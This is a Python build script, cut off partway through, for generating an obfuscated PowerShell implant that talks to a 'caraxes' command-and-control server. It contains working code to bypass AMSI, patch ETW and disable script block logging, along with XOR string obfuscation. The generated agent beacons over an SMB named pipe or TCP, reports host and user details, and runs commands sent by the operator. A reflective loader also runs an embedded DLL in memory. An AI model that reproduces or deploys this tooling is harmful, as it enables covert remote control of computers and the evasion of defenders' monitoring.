#!/usr/bin/env python3
"""
Build script for generating an obfuscated PowerShell SMB pipe agent.

Produces a .ps1 that connects to a caraxes SMB listener's named pipe,
performs AES-CBC+HMAC encrypted comms over a JSON protocol, and runs
tasks received from the C2.

Evasion:
  - AMSI bypass   (AmsiScanBuffer patch via reflection)
  - ETW bypass    (EtwEventWrite ret-patch)
  - SBL bypass    (ScriptBlock Logging disable)
  - String obfuscation (XOR + base64)
  - Variable / function name randomization

Usage (standalone):
  python build_powershell.py \\
    --pipe-host 172.17.10.121 --pipe-name TSVCPIPE-abc \\
    --output builds/agent.ps1

Usage (from operator shell via generate command):
  generate --format powershell --listener SMB
"""

import argparse
import base64
import gzip
import hashlib
import json
import os
import random
import re
import secrets
import string
import sys
from datetime import datetime
from pathlib import Path


# ─── Obfuscation helpers ───

def _rand_name(length: int = 8) -> str:
    """Generate a random variable name."""
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=length - 1)
    )


def _xor_encode(s: str, key: bytes) -> tuple[str, str]:
    """XOR-encode a string, return (base64_encoded, key_base64)."""
    data = s.encode('utf-8')
    encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    return base64.b64encode(encoded).decode(), base64.b64encode(key).decode()


def _make_xor_decoder(var_name: str, encoded_b64: str, key_b64: str,
                       fn_decode: str) -> str:
    """Generate PS code that decodes a XOR-encoded string at runtime."""
    return (
        f'${var_name}={fn_decode} "{encoded_b64}" "{key_b64}"'
    )


def _obfuscate_string_literal(s: str, fn_decode: str) -> str:
    """Return a PS expression that evaluates to the original string."""
    key = secrets.token_bytes(8)
    enc_b64, key_b64 = _xor_encode(s, key)
    return f'({fn_decode} "{enc_b64}" "{key_b64}")'


# ─── Evasion modules ───

def _amsi_bypass(v: dict) -> str:
    """AMSI bypass via reflection — sets amsiInitFailed."""
    # Obfuscated type and field names to avoid static signatures
    return f"""\
# ── AMSI ──
try{{
${v['a1']}=[char]83+[char]121+[char]115+[char]116+[char]101+[char]109
${v['a2']}=[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116
${v['a3']}=[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110
${v['a4']}=[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115
${v['a5']}="${{$({v['a1']})}}.${{{v['a2']}}}.${{{v['a3']}}}.${{{v['a4']}}}"
${v['a6']}=[Ref].Assembly.GetType(${v['a5']})
${v['a7']}=[char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100
${v['a8']}=${v['a6']}.GetField(${v['a7']},'NonPublic,Static')
${v['a8']}.SetValue($null,$true)
}}catch{{}}
"""


def _etw_bypass(v: dict) -> str:
    """ETW bypass -- patches EtwEventWrite to ret via reflection. No Add-Type, no static IoCs."""
    def _c(s):
        return '+'.join(f'[char]{ord(c)}' for c in s)

    return f"""\
# -- ETW --
try{{
${v['e1']}=$null;foreach(${v['e2']} in [AppDomain]::CurrentDomain.GetAssemblies()){{try{{${v['e1']}=${v['e2']}.GetType(({_c('Microsoft.Win32.UnsafeNativeMethods')}))}}catch{{}};if(${v['e1']}){{break}}}}
if(${v['e1']}){{
${v['e3']}=${v['e1']}.GetMethod(({_c('GetProcAddress')}),[type[]]@([Runtime.InteropServices.HandleRef],[string]))
${v['e4']}=${v['e1']}.GetMethod(({_c('GetModuleHandle')}))
${v['e5']}=New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr),${v['e4']}.Invoke($null,@(({_c('ntdll')}))))
${v['e6']}=${v['e3']}.Invoke($null,@(${v['e5']},({_c('EtwEventWrite')})))
${v['e7']}=New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr),${v['e4']}.Invoke($null,@(({_c('kernel32')}))))
${v['e8']}=${v['e3']}.Invoke($null,@(${v['e7']},({_c('VirtualProtect')})))
${v['e9']}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('E')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false)
${v['e10']}=${v['e9']}.DefineType('D'+[guid]::NewGuid().ToString('N'),'Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate])
${v['e10']}.DefineConstructor('RTSpecialName,HideBySig,Public','Standard',@([IntPtr],[IntPtr])).SetImplementationFlags('Runtime,Managed')
${v['e10']}.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',[bool],@([IntPtr],[UIntPtr],[uint32],[uint32].MakeByRefType())).SetImplementationFlags('Runtime,Managed')
${v['e11']}=${v['e10']}.CreateType()
${v['e12']}=[type](({_c('System.Runtime.InteropServices.Marshal')}))
${v['e13']}=${v['e12']}.GetMethod(({_c('GetDelegateForFunctionPointer')}),[type[]]@([IntPtr],[type]))
${v['e14']}=${v['e13']}.Invoke($null,@(${v['e8']},${v['e11']}))
[uint32]${v['e15']}=0
${v['e14']}.Invoke(${v['e6']},[UIntPtr]1,64,[ref]${v['e15']})|Out-Null
${v['e12']}::WriteByte(${v['e6']},195)
${v['e14']}.Invoke(${v['e6']},[UIntPtr]1,${v['e15']},[ref]${v['e15']})|Out-Null
}}
}}catch{{}}
"""



def _sbl_bypass(v: dict) -> str:
    """Script Block Logging bypass via reflection."""
    return f"""\
# ── SBL ──
try{{
${v['s1']}=[char]83+[char]99+[char]114+[char]105+[char]112+[char]116+[char]66+[char]108+[char]111+[char]99+[char]107
${v['s2']}=[char]76+[char]111+[char]103+[char]103+[char]105+[char]110+[char]103
${v['s3']}="System.Management.Automation."+${v['s1']}+${v['s2']}
${v['s4']}=[Ref].Assembly.GetType(${v['s3']})
if(${v['s4']}){{
${v['s5']}=${v['s4']}.GetField('signatures','NonPublic,Static')
if(${v['s5']}){{${v['s5']}.SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))}}
}}
}}catch{{}}
"""


# ─── Crypto module ───

def _crypto_functions(v: dict) -> str:
    """AES-256-CBC + HMAC-SHA256 encrypt/decrypt functions."""
    return f"""\
# ── Crypto ──
function {v['fn_encrypt']}(${{data}},${{key}}){{
  ${{aes}}=[Security.Cryptography.Aes]::Create()
  ${{aes}}.Mode='CBC';${{aes}}.Padding='PKCS7';${{aes}}.KeySize=256;${{aes}}.Key=${{key}}
  ${{aes}}.GenerateIV();${{iv}}=${{aes}}.IV
  ${{enc}}=${{aes}}.CreateEncryptor()
  ${{ms}}=[IO.MemoryStream]::new()
  ${{cs}}=[Security.Cryptography.CryptoStream]::new(${{ms}},${{enc}},'Write')
  ${{cs}}.Write(${{data}},0,${{data}}.Length);${{cs}}.FlushFinalBlock()
  ${{ct}}=${{ms}}.ToArray();${{cs}}.Close();${{ms}}.Close();${{aes}}.Dispose()
  ${{hm}}=[Security.Cryptography.HMACSHA256]::new(${{key}})
  ${{sg}}=[byte[]]::new(${{iv}}.Length+${{ct}}.Length)
  [Array]::Copy(${{iv}},${{sg}},16);[Array]::Copy(${{ct}},0,${{sg}},16,${{ct}}.Length)
  ${{mc}}=${{hm}}.ComputeHash(${{sg}})
  ${{out}}=[byte[]]::new(${{sg}}.Length+32)
  [Array]::Copy(${{sg}},${{out}},${{sg}}.Length);[Array]::Copy(${{mc}},0,${{out}},${{sg}}.Length,32)
  return ${{out}}
}}
function {v['fn_decrypt']}(${{data}},${{key}}){{
  if(${{data}}.Length -lt 49){{throw "bad frame"}}
  ${{iv}}=${{data}}[0..15]
  ${{mc}}=${{data}}[(${{data}}.Length-32)..(${{data}}.Length-1)]
  ${{ct}}=${{data}}[16..(${{data}}.Length-33)]
  ${{hm}}=[Security.Cryptography.HMACSHA256]::new(${{key}})
  ${{sg}}=[byte[]]::new(16+${{ct}}.Length)
  [Array]::Copy(${{iv}},${{sg}},16);[Array]::Copy(${{ct}},0,${{sg}},16,${{ct}}.Length)
  ${{em}}=${{hm}}.ComputeHash(${{sg}})
  for(${{i}}=0;${{i}}-lt 32;${{i}}++){{if(${{mc}}[${{i}}]-ne ${{em}}[${{i}}]){{throw "hmac"}}}}
  ${{aes}}=[Security.Cryptography.Aes]::Create()
  ${{aes}}.Mode='CBC';${{aes}}.Padding='PKCS7';${{aes}}.KeySize=256
  ${{aes}}.Key=${{key}};${{aes}}.IV=${{iv}}
  ${{dc}}=${{aes}}.CreateDecryptor()
  ${{ms}}=[IO.MemoryStream]::new([byte[]]${{ct}})
  ${{cs}}=[Security.Cryptography.CryptoStream]::new(${{ms}},${{dc}},'Read')
  ${{rs}}=[IO.MemoryStream]::new();${{cs}}.CopyTo(${{rs}})
  ${{cs}}.Close();${{ms}}.Close();${{aes}}.Dispose()
  return ${{rs}}.ToArray()
}}
"""


# ─── Pipe I/O ───

def _pipe_io(v: dict) -> str:
    """Framed pipe read/write functions."""
    return f"""\
# ── Pipe I/O ──
function {v['fn_write']}(${{pipe}},${{data}}){{
  ${{lb}}=[BitConverter]::GetBytes([uint32]${{data}}.Length)
  ${{pipe}}.Write(${{lb}},0,4);${{pipe}}.Write(${{data}},0,${{data}}.Length);${{pipe}}.Flush()
}}
function {v['fn_read']}(${{pipe}}){{
  ${{lb}}=[byte[]]::new(4)
  ${{n}}=0;while(${{n}}-lt 4){{${{r}}=${{pipe}}.Read(${{lb}},${{n}},4-${{n}});if(${{r}}-eq 0){{throw "closed"}};${{n}}+=${{r}}}}
  ${{ln}}=[BitConverter]::ToUInt32(${{lb}},0)
  if(${{ln}}-gt 16MB){{throw "too large"}}
  ${{buf}}=[byte[]]::new(${{ln}});${{n}}=0
  while(${{n}}-lt ${{ln}}){{${{r}}=${{pipe}}.Read(${{buf}},${{n}},${{ln}}-${{n}});if(${{r}}-eq 0){{throw "closed"}};${{n}}+=${{r}}}}
  return ${{buf}}
}}
"""


# ─── Agent core ───

def _agent_core(v: dict, pipe_host: str, pipe_name: str,
                psk_b64: str, sleep_sec: int, jitter_pct: int,
                kill_date: str, agent_id: str = "",
                transport: str = "pipe", tcp_port: int = 0) -> str:
    """Main agent logic — connect, handshake, beacon loop."""

    kill_check = ""
    if kill_date:
        kill_check = f"""\
if([DateTime]::UtcNow -gt [DateTime]::Parse("{kill_date}")){{return}}
"""

    if transport == "tcp":
        connect_block = f"""\
# Connect (TCP)
${v['pipe']}=$null
for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
  try{{
    ${v['tcp']}=[System.Net.Sockets.TcpClient]::new(${v['ph']},{tcp_port})
    ${v['pipe']}=${v['tcp']}.GetStream()
    break
  }}catch{{
    Start-Sleep -Seconds 2
    ${v['pipe']}=$null
  }}
}}
if(-not ${v['pipe']}){{return}}"""
    else:
        connect_block = f"""\
# Connect (SMB pipe)
${v['pipe']}=$null
for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
  try{{
    ${v['pipe']}=[IO.Pipes.NamedPipeClientStream]::new(${v['ph']},${v['pn']},[IO.Pipes.PipeDirection]::InOut)
    ${v['pipe']}.Connect(10000)
    break
  }}catch{{
    Start-Sleep -Seconds 2
    ${v['pipe']}=$null
  }}
}}
if(-not ${v['pipe']}){{return}}"""

    core = f"""\
# ── Agent ──
{kill_check}${v['psk']}=[Convert]::FromBase64String("{psk_b64}")
${v['ph']}="{pipe_host}"
${v['pn']}="{pipe_name}"
${v['sl']}={sleep_sec}
${v['jt']}={jitter_pct}

{connect_block}

# Handshake — [PS 0x01 0x00] [32B nonce] [32B HMAC(nonce,PSK)]
${v['nonce']}=[byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(${v['nonce']})
${v['hm']}=[Security.Cryptography.HMACSHA256]::new(${v['psk']})
${v['mac']}=${v['hm']}.ComputeHash(${v['nonce']})
${v['hs']}=[byte[]]::new(68)
${v['hs']}[0]=0x50;${v['hs']}[1]=0x53;${v['hs']}[2]=0x01;${v['hs']}[3]=0x00
[Array]::Copy(${v['nonce']},0,${v['hs']},4,32)
[Array]::Copy(${v['mac']},0,${v['hs']},36,32)
{v['fn_write']} ${v['pipe']} ${v['hs']}

# Read server handshake response [OK 0x01 0x00] [32B server_nonce]
${v['sr']}={v['fn_read']} ${v['pipe']}
if(${v['sr']}[0]-ne 0x4F -or ${v['sr']}[1]-ne 0x4B){{${v['pipe']}.Close();return}}
${v['sn']}=${v['sr']}[4..35]

# Derive session key = SHA256(PSK + client_nonce + server_nonce)
${v['sha']}=[Security.Cryptography.SHA256]::Create()
${v['km']}=[byte[]]::new(96)
[Array]::Copy(${v['psk']},0,${v['km']},0,32)
[Array]::Copy(${v['nonce']},0,${v['km']},32,32)
[Array]::Copy(${v['sn']},0,${v['km']},64,32)
${v['sk']}=${v['sha']}.ComputeHash(${v['km']})

# ── Checkin ──
${v['ci']}=@{{
  t="ci"
  id="{agent_id}"
  h=$env:COMPUTERNAME
  u="$env:USERDOMAIN\\$env:USERNAME"
  p=$PID
  a=if([IntPtr]::Size-eq 8){{"x64"}}else{{"x86"}}
  o=[Environment]::OSVersion.Version.ToString()
  n=(Get-Process -Id $PID).ProcessName
  v="1.0.0"
  dn=if($PSVersionTable.CLRVersion){{$PSVersionTable.CLRVersion.ToString()}}else{{"4.0.0"}}
}}|ConvertTo-Json -Compress
${v['enc']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['ci']})) ${v['sk']}
{v['fn_write']} ${v['pipe']} ${v['enc']}

# ── Beacon loop ──
while($true){{
  try{{
    ${v['raw']}={v['fn_read']} ${v['pipe']}
    ${v['dec']}={v['fn_decrypt']} ${v['raw']} ${v['sk']}
    ${v['msg']}=[Text.Encoding]::UTF8.GetString(${v['dec']})|ConvertFrom-Json

    if(${v['msg']}.t -eq "tasks"){{
      foreach(${v['tk']} in ${v['msg']}.d){{
        ${v['out']}=""
        ${v['st']}=0
        try{{
          if(${v['tk']}.c -eq "shell"){{
            ${v['out']}=cmd.exe /c ${v['tk']}.a 2>&1|Out-String
          }}elseif(${v['tk']}.c -eq "powershell"){{
            ${v['out']}=Invoke-Expression ${v['tk']}.a 2>&1|Out-String
          }}elseif(${v['tk']}.c -eq "exit"){{
            ${v['pipe']}.Close();return
          }}else{{
            ${v['cmd']}=${v['tk']}.c
            if(${v['tk']}.a){{${v['cmd']}+=" "+${v['tk']}.a}}
            ${v['out']}=Invoke-Expression ${v['cmd']} 2>&1|Out-String
          }}
        }}catch{{
          ${v['out']}=$_.ToString()
          ${v['st']}=1
        }}
        ${v['rj']}=@{{t="result";i=${v['tk']}.i;o=${v['out']};s=${v['st']}}}|ConvertTo-Json -Compress
        ${v['re']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['rj']})) ${v['sk']}
        {v['fn_write']} ${v['pipe']} ${v['re']}
      }}
    }}

    # Sleep with jitter
    ${v['jv']}=Get-Random -Minimum (-(${v['jt']})) -Maximum ${v['jt']}
    ${v['sw']}=[Math]::Max(1, ${v['sl']}+[int](${v['sl']}*${v['jv']}/100))
    Start-Sleep -Seconds ${v['sw']}

    # Heartbeat
    ${v['hb']}=@{{t="hb"}}|ConvertTo-Json -Compress
    ${v['he']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['hb']})) ${v['sk']}
    {v['fn_write']} ${v['pipe']} ${v['he']}

  }}catch{{
    break
  }}
}}
try{{${v['pipe']}.Close()}}catch{{}}
"""
    if transport == "tcp":
        # Also close the TcpClient
        core += f"try{{${v['tcp']}.Close()}}catch{{}}\n"
    return core


# ─── Reflective PE loader ───

def _pe_loader(v: dict, dll_b64_gz: str, debug: bool = False) -> str:
    """Generate PowerShell reflective PE loader -- IoC-free via reflection + dynamic delegates."""
    _d = 'Write-Host' if debug else '#'

    def _c(s):
        return '+'.join(f'[char]{ord(c)}' for c in s)

    return f"""\
# -- Reflective Loader --

# Bootstrap: resolve native APIs via reflection
${v['lun']}=$null
foreach(${v['las']} in [AppDomain]::CurrentDomain.GetAssemblies()){{
try{{${v['lun']}=${v['las']}.GetType(({_c('Microsoft.Win32.UnsafeNativeMethods')}))}}catch{{}}
if(${v['lun']}){{break}}
}}
if(-not ${v['lun']}){{Write-Host "FATAL: init failed";return}}
{_d} "[DBG] Bootstrap OK"
${v['lgp']}=${v['lun']}.GetMethod(({_c('GetProcAddress')}),[type[]]@([Runtime.InteropServices.HandleRef],[string]))
${v['lgm']}=${v['lun']}.GetMethod(({_c('GetModuleHandle')}))
if(-not ${v['lgp']} -or -not ${v['lgm']}){{Write-Host "FATAL: method resolve failed";return}}
${v['lkh']}=${v['lgm']}.Invoke($null,@(({_c('kernel32')})))
${v['lkr']}=New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr),${v['lkh']})

# Marshal type (obfuscated)
${v['lm']}=[type](({_c('System.Runtime.InteropServices.Marshal')}))
${v['lgd']}=${v['lm']}.GetMethod(({_c('GetDelegateForFunctionPointer')}),[type[]]@([IntPtr],[type]))

# Dynamic delegate factory via Reflection.Emit
${v['lmb']}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('R')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false)
${v['lfd']}={{param(${{rt}},${{pa}})
${{dt}}=${v['lmb']}.DefineType('T'+[guid]::NewGuid().ToString('N'),'Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate])
${{dt}}.DefineConstructor('RTSpecialName,HideBySig,Public','Standard',@([IntPtr],[IntPtr])).SetImplementationFlags('Runtime,Managed')
${{dt}}.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',${{rt}},${{pa}}).SetImplementationFlags('Runtime,Managed')
${{dt}}.CreateType()}}

# Create delegate types
${v['ltv']}=&${v['lfd']} ([IntPtr]) @([IntPtr],[UIntPtr],[uint32],[uint32])
${v['ltl']}=&${v['lfd']} ([IntPtr]) @([IntPtr])
${v['ltg']}=&${v['lfd']} ([IntPtr]) @([IntPtr],[IntPtr])
${v['ltm']}=&${v['lfd']} ([bool]) @([IntPtr],[uint32],[IntPtr])

# Resolve Win32 functions
${v['lfv']}=${v['lgd']}.Invoke($null,@(${v['lgp']}.Invoke($null,@(${v['lkr']},({_c('VirtualAlloc')}))),${v['ltv']}))
${v['lfl']}=${v['lgd']}.Invoke($null,@(${v['lgp']}.Invoke($null,@(${v['lkr']},({_c('LoadLibraryA')}))),${v['ltl']}))
${v['lfg']}=${v['lgd']}.Invoke($null,@(${v['lgp']}.Invoke($null,@(${v['lkr']},({_c('GetProcAddress')}))),${v['ltg']}))
if(-not ${v['lfv']} -or -not ${v['lfl']} -or -not ${v['lfg']}){{Write-Host "FATAL: API resolve failed";return}}
{_d} "[DBG] APIs resolved"

# Decompress embedded DLL
${v['lb6']}=@'
{dll_b64_gz}
'@
try{{
${v['lgz']}=[Convert]::FromBase64String(${v['lb6']})
${v['lms']}=[IO.MemoryStream]::new(${v['lgz']})
${v['lgs']}=[IO.Compression.GZipStream]::new(${v['lms']},[IO.Compression.CompressionMode]::Decompress)
${v['los']}=[IO.MemoryStream]::new()
${v['lgs']}.CopyTo(${v['los']})
${v['ldl']}=${v['los']}.ToArray()
${v['lgs']}.Close();${v['lms']}.Close();${v['los']}.Close()
}}catch{{Write-Host "FATAL: Decompress failed: $_";return}}
{_d} "[DBG] DLL bytes: $(${v['ldl']}.Length)"
# Arch check
if([IntPtr]::Size -eq 4){{
${v['lmg']}=[BitConverter]::ToUInt16(${v['ldl']},([BitConverter]::ToInt32(${v['ldl']},0x3C))+24)
if(${v['lmg']}-eq 0x20b){{Write-Host "FATAL: x64 DLL loaded in 32-bit PowerShell";return}}
}}

# Parse PE
${v['lef']}=[BitConverter]::ToInt32(${v['ldl']},0x3C)
${v['lns']}=[BitConverter]::ToUInt16(${v['ldl']},${v['lef']}+6)
${v['lso']}=[BitConverter]::ToUInt16(${v['ldl']},${v['lef']}+20)
${v['lop']}=${v['lef']}+24
${v['lmg']}=[BitConverter]::ToUInt16(${v['ldl']},${v['lop']})
${v['l64']}=${v['lmg']}-eq 0x20b
if(${v['l64']}){{
${v['ler']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+16)
${v['lib']}=[BitConverter]::ToInt64(${v['ldl']},${v['lop']}+24)
${v['lsi']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+56)
${v['lsh']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+60)
${v['lir']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+120)
${v['lis']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+124)
${v['lrr']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+152)
${v['lrs']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+156)
}}else{{
${v['ler']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+16)
${v['lib']}=[int64][BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+28)
${v['lsi']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+56)
${v['lsh']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+60)
${v['lir']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+104)
${v['lis']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+108)
${v['lrr']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+136)
${v['lrs']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+140)
}}
{_d} "[DBG] PE: magic=0x$(${v['lmg']}.ToString('X4')) entry=0x$(${v['ler']}.ToString('X')) imgBase=0x$(${v['lib']}.ToString('X')) size=0x$(${v['lsi']}.ToString('X'))"

# Allocate -- try preferred base, fall back to any
${v['lnb']}=${v['lfv']}.Invoke([IntPtr]${v['lib']},[UIntPtr][uint64]${v['lsi']},12288,64)
if(${v['lnb']}-eq [IntPtr]::Zero){{
{_d} "[DBG] Preferred base failed, trying any"
${v['lnb']}=${v['lfv']}.Invoke([IntPtr]::Zero,[UIntPtr][uint64]${v['lsi']},12288,64)
}}
if(${v['lnb']}-eq [IntPtr]::Zero){{Write-Host "FATAL: alloc failed - size=$(${v['lsi']})";return}}
{_d} "[DBG] Allocated at 0x$(${v['lnb']}.ToString('X'))"

# Copy headers
${v['lm']}::Copy(${v['ldl']},0,${v['lnb']},[int]${v['lsh']})

# Copy sections
${v['lsc']}=${v['lop']}+${v['lso']}
for(${v['li']}=0;${v['li']}-lt ${v['lns']};${v['li']}++){{
${v['lva']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lsc']}+12)
${v['lrd']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lsc']}+16)
${v['lrp']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lsc']}+20)
if(${v['lrd']}-gt 0 -and ${v['lrp']}-gt 0){{
${v['lds']}=[IntPtr]::Add(${v['lnb']},[int]${v['lva']})
${v['lm']}::Copy(${v['ldl']},[int]${v['lrp']},${v['lds']},[int]${v['lrd']})
}}
${v['lsc']}+=40
}}
{_d} "[DBG] $(${v['lns']}) sections copied"

# Process relocations
${v['ldt']}=${v['lnb']}.ToInt64()-${v['lib']}
if(${v['ldt']}-ne 0 -and ${v['lrr']}-gt 0 -and ${v['lrs']}-gt 0){{
{_d} "[DBG] Relocations: delta=0x$(${v['ldt']}.ToString('X'))"
${v['lpo']}=[IntPtr]::Add(${v['lnb']},[int]${v['lrr']})
${v['len']}=${v['lpo']}.ToInt64()+${v['lrs']}
while(${v['lpo']}.ToInt64()-lt ${v['len']}){{
${v['lbv']}=${v['lm']}::ReadInt32(${v['lpo']})
${v['lbz']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lpo']},4))
if(${v['lbz']}-le 8){{break}}
${v['lne']}=[int](([int]${v['lbz']}-8)/2)
for(${v['lj']}=0;${v['lj']}-lt ${v['lne']};${v['lj']}++){{
${v['lra']}=${v['lm']}::ReadInt16([IntPtr]::Add(${v['lpo']},8+${v['lj']}*2))-band 0xFFFF
${v['let']}=(${v['lra']}-shr 12)-band 0xF
${v['leo']}=${v['lra']}-band 0xFFF
if(${v['let']}-eq 10){{
${v['lad']}=[IntPtr]::Add(${v['lnb']},${v['lbv']}+${v['leo']})
${v['lv']}=${v['lm']}::ReadInt64(${v['lad']})
${v['lm']}::WriteInt64(${v['lad']},${v['lv']}+${v['ldt']})
}}elseif(${v['let']}-eq 3){{
${v['lad']}=[IntPtr]::Add(${v['lnb']},${v['lbv']}+${v['leo']})
${v['lv']}=${v['lm']}::ReadInt32(${v['lad']})
${v['lm']}::WriteInt32(${v['lad']},[int](${v['lv']}+${v['ldt']}))
}}
}}
${v['lpo']}=[IntPtr]::Add(${v['lpo']},[int]${v['lbz']})
}}
}}
{_d} "[DBG] Relocations done"

# Resolve imports
if(${v['lir']}-gt 0 -and ${v['lis']}-gt 0){{
${v['lid']}=[IntPtr]::Add(${v['lnb']},[int]${v['lir']})
while($true){{
${v['lit']}=${v['lm']}::ReadInt32(${v['lid']})
${v['lin']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},12))
${v['lia']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},16))
if(${v['lin']}-eq 0){{break}}
if(${v['lit']}-eq 0){{${v['lit']}=${v['lia']}}}
${v['lsp']}=${v['lm']}::StringToHGlobalAnsi(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))
${v['lmh']}=${v['lfl']}.Invoke(${v['lsp']})
${v['lm']}::FreeHGlobal(${v['lsp']})
if(${v['lmh']}-eq [IntPtr]::Zero){{Write-Host "FATAL: module load failed for $(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))";return}}
${v['lpt']}=[IntPtr]::Add(${v['lnb']},[int]${v['lit']})
${v['lad']}=[IntPtr]::Add(${v['lnb']},[int]${v['lia']})
while($true){{
if(${v['l64']}){{
${v['lie']}=${v['lm']}::ReadInt64(${v['lpt']})
if(${v['lie']}-eq 0){{break}}
if(${v['lie']}-lt 0){{
${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
}}else{{
${v['lfn']}=${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int](${v['lie']}-band 0x7FFFFFFF)+2))
${v['lsp']}=${v['lm']}::StringToHGlobalAnsi(${v['lfn']})
${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},${v['lsp']})
${v['lm']}::FreeHGlobal(${v['lsp']})
}}
${v['lm']}::WriteInt64(${v['lad']},${v['lfa']}.ToInt64())
${v['lpt']}=[IntPtr]::Add(${v['lpt']},8)
${v['lad']}=[IntPtr]::Add(${v['lad']},8)
}}else{{
${v['lie']}=${v['lm']}::ReadInt32(${v['lpt']})
if(${v['lie']}-eq 0){{break}}
if(${v['lie']}-lt 0){{
${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
}}else{{
${v['lfn']}=${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int](${v['lie']}-band 0x7FFFFFFF)+2))
${v['lsp']}=${v['lm']}::StringToHGlobalAnsi(${v['lfn']})
${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},${v['lsp']})
${v['lm']}::FreeHGlobal(${v['lsp']})
}}
${v['lm']}::WriteInt32(${v['lad']},${v['lfa']}.ToInt32())
${v['lpt']}=[IntPtr]::Add(${v['lpt']},4)
${v['lad']}=[IntPtr]::Add(${v['lad']},4)
}}
}}
${v['lid']}=[IntPtr]::Add(${v['lid']},20)
}}
}}
{_d} "[DBG] Imports resolved"

# Execute entry point (DllMainCRTStartup -> DllMain)
${v['lep']}=[IntPtr]::Add(${v['lnb']},[int]${v['ler']})
{_d} "[DBG] Calling entry at 0x$(${v['lep']}.ToString('X'))"
try{{
${v['ldm']}=${v['lgd']}.Invoke($null,@(${v['lep']},${v['ltm']}))
${v['ldm']}.Invoke(${v['lnb']},[uint32]1,[IntPtr]::Zero)
}}catch{{Write-Host "FATAL: DllMain exception: $_";return}}
{_d} "[DBG] DllMain returned OK, keeping process alive"
while($true){{Start-Sleep 86400}}
"""



# ─── Main build function ───

def build_powershell_agent(
    pipe_host: str,
    pipe_name: str,
    sleep_sec: int = 60,
    jitter_pct: int = 25,
    kill_date: str = "",
    psk: bytes = None,
    no_amsi: bool = False,
    no_etw: bool = False,
    no_sbl: bool = False,
    debug: bool = False,
    output_path: Path = None,
    transport: str = "pipe",
    tcp_port: int = 0,
) -> tuple[Path, bytes]:
    """
    Generate an obfuscated PowerShell agent.

    transport: "pipe" for SMB named pipe, "tcp" for raw TCP.
    Returns (output_path, psk_bytes).
    """
    if psk is None:
        psk = secrets.token_bytes(32)

    psk_b64 = base64.b64encode(psk).decode()

    # Agent ID — persistent across reconnects
    agent_id = secrets.token_hex(16)

    # Generate randomized variable names
    v = {}
    needed_vars = [
        # AMSI
        'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8',
        # ETW
        'e1', 'e2', 'e3', 'e4', 'e5', 'e6',
        'e7', 'e8', 'e9', 'e10', 'e11', 'e12', 'e13', 'e14', 'e15',
        # SBL
        's1', 's2', 's3', 's4', 's5',
        # Agent
        'psk', 'ph', 'pn', 'sl', 'jt', 'pipe', 'tcp', 'retry',
        'nonce', 'hm', 'mac', 'hs', 'sr', 'sn',
        'sha', 'km', 'sk',
        'ci', 'enc', 'raw', 'dec', 'msg',
        'tk', 'out', 'st', 'rj', 're', 'cmd',
        'jv', 'sw', 'hb', 'he',
    ]
    used = set()
    for var in needed_vars:
        name = _rand_name(random.randint(6, 10))
        while name in used:
